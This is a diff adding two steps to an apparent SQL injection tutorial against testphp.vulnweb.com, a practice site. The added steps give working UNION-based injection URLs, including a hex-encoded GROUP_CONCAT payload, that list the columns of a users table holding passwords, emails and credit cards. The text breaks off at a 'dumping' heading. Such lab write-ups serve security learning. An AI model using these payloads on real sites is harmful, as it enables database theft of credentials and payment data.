@@ -104,6 +104,35 @@ we can easily dump the table names once using the ``concat`` statement
 
 cool we have the table names in a single shot
 
+**STEP 8**
+
+``getting the column names: we can get the columns in a table we want``
+
+```http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,column_name,3 from information_schema.columns where table_schema=database() and table_name='users' limit 0,1```
+
+Here i tried getting the columns in the *users* table 
+NB: remember to keep increasing the number of limit after the query
+
+so to get the columns in a shot we can use
+
+```(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x7573657273+AND+TABLE_SCHEMA=DATABASE())```
+
+NB: I hex encoded the table name *users* to avoid errors
+
+![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/c70af46f-e483-4d4e-a33a-88a78bd5524e)
+
+As you can see we have the columns in the users table which are emails,creditcards,address,password e.t.c
+
+```http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x7573657273+AND+TABLE_SCHEMA=DATABASE()),3```
+
+let's proceed to the next step
+
+**STEP 9** 
+
+``dumping the juicy contents of the database like passwords,emails,creditcards e.t.c``
+
+
+
 
 
 
